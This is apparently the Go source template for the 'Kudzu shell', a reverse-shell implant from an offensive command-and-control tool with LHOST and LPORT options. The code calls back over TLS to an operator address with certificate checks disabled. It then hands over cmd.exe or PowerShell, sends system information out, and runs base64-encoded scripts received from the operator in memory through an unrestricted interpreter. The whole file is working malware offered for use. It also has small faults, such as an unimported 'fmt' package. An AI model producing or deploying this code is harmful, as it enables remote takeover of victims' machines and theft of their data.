/*{
Description: Kudzu shell. Provides access to kudzu scripts, cmd, and powershell. This was a pain to make.
Author: TerminalJockey
Options:
LHOST
LPORT
}*/


package main

import (
	"bufio"
	"encoding/base64"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"
    "crypto/tls"
	"crypto/x509"

	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/syscall"
	"github.com/traefik/yaegi/stdlib/unrestricted"
	"github.com/traefik/yaegi/stdlib/unsafe"
)

func main() {
	certs := x509.NewCertPool()
	certstring := []byte(`{{.Cert}}`)
	
	csuites := []uint16{0x0005, 0x000a, 0x002f, 0x0035, 0x003c, 0x009c, 0x009d, 0xc007, 0xc009, 0xc00a, 0xc011, 0xc012, 0xc014, 0xc013, 0xc023, 0xc027, 0xc02f, 0xc02b, 0xc030, 0xc02c, 0xcca8, 0xcca9}
	certs.AppendCertsFromPEM(certstring)
	revcon, err := tls.Dial("tcp", "{{.Laddr}}", &tls.Config{RootCAs: certs, MinVersion: tls.VersionTLS11, 
		MaxVersion: tls.VersionTLS11, InsecureSkipVerify: true, CipherSuites: csuites})
	if err != nil {
		log.Println(err)
	}
	conbuf := bufio.NewReader(revcon)
	for {
		revcon.Write([]byte("<kudzu shell> "))
		str, err := conbuf.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				log.Println(err)
			}
			break
		}
		args := strings.Split(strings.TrimSpace(str), " ")
		switch args[0] {
		case "runscript":
			RunScript(revcon)
		case "sysinfo":
			sysinfo, err := exec.Command("systeminfo").CombinedOutput()
			if err != nil {
				log.Println(err)
			}
			revcon.Write(sysinfo)
		case "cmdshell":
			newcon := revcon
			CmdShell(newcon)
		case "pwshell":
			newcon := revcon
			PwShell(newcon)
		case "help":
			revcon.Write([]byte("sysinfo: print system info to console\n"))
			revcon.Write([]byte("cmdshell: spawn cmd.exe shell\n"))
			revcon.Write([]byte("pwshell: spawn powershell.exe shell\n"))
			revcon.Write([]byte("kdz_bg: background current session, return to kdz console\n"))
			revcon.Write([]byte("kdz_exit: exit current session, return to kdz console\n"))
			revcon.Write([]byte("runscript: run provided kzs in memory. usage: runscript win_calc.kzs\n"))
		}
	}
}

//CmdShell hooks up cmd.exe to the tcp connection
func CmdShell(conn net.Conn) {
	cmd := exec.Command("cmd.exe")
	cmd.Stdout = conn
	cmd.Stdin = conn
	cmd.Run()
	conn.Write([]byte("done\n"))
}

//PwShell hooks up powershell.exe to the tcp connection
func PwShell(conn net.Conn) {
	cmd := exec.Command("powershell.exe")
	cmd.Stdout = conn
	cmd.Stdin = conn
	cmd.Run()
	conn.Write([]byte("done\n"))
}

//RunScript runs given kzs
func RunScript(conn net.Conn) {
	script, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.Println(err)
	}
	scriptbytes, err := base64.RawStdEncoding.DecodeString(script)
	if err != nil {
		log.Println(err)
	}
	go interpret(scriptbytes)
}

//RunScriptWithOutput runs given kzs and returns output
func RunScriptWithOutput(conn net.Conn) {
	fmt.Println("entered RunScriptWithOutput")
	script, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		log.Println(err)
	}
	scriptbytes, err := base64.RawStdEncoding.DecodeString(script)
	if err != nil {
		log.Println(err)
	}
	go interpretWithOutput(scriptbytes, conn)
}

func interpret(scriptbytes []byte) {
	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)
	i.Use(unrestricted.Symbols)
	i.Use(syscall.Symbols)
	i.Use(unsafe.Symbols)
	_, err := i.Eval(string(scriptbytes))
	if err != nil {
		log.Println(err)
	}
}

func interpretWithOutput(scriptbytes []byte, revcon net.Conn) {
	i := interp.New(interp.Options{})
	i.Use(stdlib.Symbols)
	i.Use(unsafe.Symbols)
	i.Use(syscall.Symbols)
	i.Use(unrestricted.Symbols)
	
	fmt.Println(string(scriptbytes))
	i.Eval(string(scriptbytes))
	v, err := i.Eval("runner.RunScript")
	if err != nil {
		revcon.Write([]byte(err.Error() + "\n"))
		return
	}
	runscript := v.Interface().(func() string)

	out := runscript()
	fmt.Println(out)
	revcon.Write([]byte(out))
}